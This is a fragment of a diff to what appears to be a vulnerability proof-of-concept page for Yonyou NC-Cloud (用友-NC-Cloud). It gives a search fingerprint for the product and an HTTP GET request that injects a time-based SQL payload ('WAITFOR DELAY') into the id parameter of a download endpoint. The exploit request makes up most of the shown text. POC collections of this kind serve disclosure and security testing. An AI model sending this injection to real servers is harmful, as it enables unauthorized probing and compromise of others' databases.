@@ -8,7 +8,7 @@
 app="用友-NC-Cloud"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
